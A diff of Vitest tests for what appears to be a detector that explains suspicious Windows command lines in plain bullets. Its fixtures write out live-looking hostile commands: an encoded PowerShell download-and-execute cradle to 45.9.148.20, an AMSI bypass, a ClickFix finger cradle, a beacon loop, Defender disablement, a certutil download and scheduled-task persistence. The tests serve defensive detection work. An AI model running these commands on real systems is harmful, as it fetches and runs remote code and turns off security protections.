@@ -2,6 +2,8 @@
 import { describe, expect, it } from 'vitest'
 import { deriveBullets } from '../bullets'
 import { buildContext } from '../techniques'
+import { analyze } from '../report'
+import { RULES as TECHNIQUE_RULES } from '../techniques'
 import type { DecodedLayer, ExtractedIoc, Signal } from '../types'
 
 function sig(id: string, overrides: Partial<Signal> = {}): Signal {
@@ -220,5 +222,111 @@ describe('deriveBullets — WSH honesty signals quarantine to opaque', () => {
     const bullets = deriveBullets(buildContext('', [], 'wscript'), [], [], [sig('wsh-decode-limits'), sig('wsh-concat-eval-present')])
     expect(bullets).toHaveLength(2)
     expect(bullets.every((b) => b.confidence === 'opaque')).toBe(true)
+  })
+})
+
+const ENC_CRADLE =
+  'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4AOQAuADEANAA4AC4AMgAwAC8AYQAuAHAAcwAxACcAKQA='
+
+describe('execution ordering (D2/D6, 11-tier): delivery → interpreter-transition → decode → evade → fetch → execute', () => {
+  it('a -enc, hidden+no-profile download→IEX cradle orders decode, then evade, then fetch, then execute, with sequential order numbers', async () => {
+    // -nop + -w + -enc = 3 evasion flags (cluster fires) AND -w+-nop+FETCH+IEX
+    // (clickfix's own hiddenFetchIex branch fires too) — but clickfix-delivery
+    // does NOT fire here (no decoy/headless text), so the ordering stays clean:
+    // decode(4) < evade(6) < fetch(7) < execute(8).
+    const r = await analyze('powershell -nop -w hidden -enc ' + ENC_CRADLE)
+    const texts = r.bullets.map((b) => b.text)
+    const decodeIdx = texts.findIndex((t) => t.includes('Base64 `-EncodedCommand`'))
+    const evadeIdx = texts.findIndex((t) => t.startsWith('Runs hidden'))
+    const fetchIdx = texts.findIndex((t) => t.includes('Downloads content from'))
+    const execIdx = texts.findIndex((t) => t.includes('Executes the downloaded content in memory'))
+    expect(decodeIdx).toBeGreaterThanOrEqual(0)
+    expect(evadeIdx).toBeGreaterThan(decodeIdx)
+    expect(fetchIdx).toBeGreaterThan(evadeIdx)
+    expect(execIdx).toBeGreaterThan(fetchIdx)
+    expect(r.bullets.map((b) => b.order)).toEqual([1, 2, 3, 4])
+    expect(texts.some((t) => t.includes('human-verification'))).toBe(false) // no delivery bullet: no decoy text present
+  })
+
+  it('a genuine ClickFix decoy fixture orders delivery FIRST, ahead of everything else', async () => {
+    const r = await analyze("cmd.exe /c for /f %e in ('finger user@45.9.148.20') do cmd.exe /c %e & echo --Verify... press ENTER to continue")
+    expect(r.bullets[0].text).toBe('Presents a fake human-verification prompt instructing the user to paste and run this command (ClickFix pattern)')
+  })
+})
+
+describe('banned-word discipline (D6, mirrors doctrine.ts, widened word list)', () => {
+  const BANNED = /\b(malicious|attacker|likely|c2|backdoor|exploit|compromise|adversary|threat actor|hack)\b/i
+
+  it('"payload" and "beacon" are allowed terms of art (used in spec §7\'s own example bullets), not banned', () => {
+    expect('Executes an mshta payload (`https://`)').not.toMatch(BANNED)
+    expect('Beacons to **45[.]9[.]148[.]20** in a loop').not.toMatch(BANNED)
+  })
+
+  it('no bullet emits a banned word across a representative fixture sweep', async () => {
+    const fixtures = [
+      'powershell -nop -w hidden -enc ' + ENC_CRADLE,
+      "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed').SetValue($null,$true); IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/a.ps1')",
+      "cmd.exe /c for /f %e in ('finger user@45.9.148.20') do cmd.exe /c %e & echo --Verify... press ENTER to continue",
+      "while ($true) { Start-Sleep 5; IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/beacon') }",
+      'mshta vbscript:Execute(Chr(87)&Chr(83)&Chr(72))',
+      'Register-ScheduledTask -TaskName evil -Action (New-ScheduledTaskAction -Execute powershell)',
+      "Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath 'C:\\x'",
+      'certutil -urlcache -f http://45.9.148.20/a.exe a.exe',
+    ]
+    for (const input of fixtures) {
+      const r = await analyze(input)
+      for (const b of r.bullets) expect(b.text).not.toMatch(BANNED)
+    }
+  })
+})
+
+describe('coverage discipline (D5/D6): every signal maps to a bullet', () => {
+  const ALL_SIGNAL_IDS = [
+    'download-cradle', 'cmd-cradle', 'evasion-cluster', 'amsi-reflection', 'amsi-memory-patch',
+    'etw-tamper', 'defender-tamper', 'clickfix', 'beaconing', 'reverse-shell', 'fileless-loader',
+    'persistence', 'lolbin', 'mshta-interpreter', 'wsh-script-exec', 'wsh-decode-limits', 'wsh-concat-eval-present',
+  ]
+
+  it('lists exactly the 17 signal ids defined in techniques.ts (fails loudly if the signal catalog changes without a matching bullets.ts update)', () => {
+    expect(TECHNIQUE_RULES.map((r) => r.id).sort()).toEqual([...ALL_SIGNAL_IDS].sort())
+  })
+
+  it.each(ALL_SIGNAL_IDS)('signal "%s" yields at least one bullet when it fires', (id) => {
+    const iocs: ExtractedIoc[] = [{ raw: '45.9.148.20', defanged: '45[.]9[.]148[.]20', type: 'ipv4', layerIndex: 0 }]
+    if (id === 'clickfix') {
+      const ctx = buildContext('captcha verify you are human', [], 'powershell')
+      expect(deriveBullets(ctx, [], [], [sig('clickfix')]).length).toBeGreaterThan(0)
+      return
+    }
+    if (id === 'lolbin') {
+      const ctx = buildContext('', [], 'powershell')
+      expect(deriveBullets(ctx, [], [], [sig('lolbin', { trigger: 'certutil' })]).length).toBeGreaterThan(0)
+      return
+    }
+    if (id === 'defender-tamper') {
+      const ctx = buildContext('Set-MpPreference -DisableRealtimeMonitoring $true', [], 'powershell')
+      expect(deriveBullets(ctx, [], [], [sig('defender-tamper')]).length).toBeGreaterThan(0)
+      return
+    }
+    const ctx = buildContext('Register-ScheduledTask', [], 'powershell') // corpus content only matters for persistence's mechanism-naming branch
+    expect(deriveBullets(ctx, [], iocs, [sig(id)]).length).toBeGreaterThan(0)
+  })
+})
+
+describe('opaque quarantine (D3/D6)', () => {
+  it('WSH/HTA honesty bullets render at opaque tier, never resolved/inferred', async () => {
+    const r = await analyze('wscript //E:vbscript C:\\Users\\Public\\payload.vbs')
+    const honesty = r.bullets.filter((b) => b.text.includes('numeric char-code decode only') || b.text.includes('string-concat / eval'))
+    expect(honesty.length).toBeGreaterThan(0)
+    expect(honesty.every((b) => b.confidence === 'opaque')).toBe(true)
+  })
+})
+
+describe('end-to-end fixture: finger/for-f cradle (D6)', () => {
+  it('yields a single resolved fetch bullet naming the for-f/finger cradle', async () => {
+    const r = await analyze("cmd /c for /f %e in ('finger user@45.9.148.20') do %e")
+    expect(r.bullets).toHaveLength(1)
+    expect(r.bullets[0].text).toBe('Fetches a command via `for /f`/finger and executes its output')
+    expect(r.bullets[0].confidence).toBe('resolved')
   })
 })
